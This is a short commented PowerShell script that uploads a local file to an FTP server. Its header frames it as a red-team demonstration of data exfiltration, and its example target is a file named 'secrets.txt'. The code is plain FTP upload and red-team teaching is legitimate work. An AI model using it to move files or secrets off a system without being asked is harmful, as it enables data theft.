<#
Title: FTP File Upload via PowerShell
Purpose: Demonstrates how a file could be uploaded to an FTP server
         — commonly used in red team simulations for data exfiltration.
Author: Subbu Krishna Raju B N
#>

# Build the target FTP URL using the server IP/hostname, port, and filename
# Example: ftp://192.168.1.10:21/uploads/secrets.txt
$ftpuri = "ftp://$($ftpserver):$($ftpport)/uploads/$($remotefilename)"

# Create an FTP WebRequest object using the target URI
$request = [System.Net.WebRequest]::Create($ftpuri)

# Set the method to UploadFile (standard FTP method)
$request.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile

# Set the FTP credentials (username and password)
$request.Credentials = New-Object System.Net.NetworkCredential($ftpusername, $ftppassword)

# Enable passive FTP mode (helps with firewall traversal)
$request.UsePassive = $true

# Enable binary mode (uploads the file as binary, not ASCII)
$request.UseBinary = $true

# Read the contents of the local file as a byte array
$filecontent = [System.IO.File]::ReadAllBytes($localfilepath)

# Set the content length of the request to match the file size
$request.ContentLength = $filecontent.Length

# Get the request stream (where data is written to the server)
$requestStream = $request.GetRequestStream()

# Write the file content to the FTP stream
$requestStream.Write($filecontent, 0, $filecontent.Length)

# Close the stream once upload is complete
$requestStream.Close()
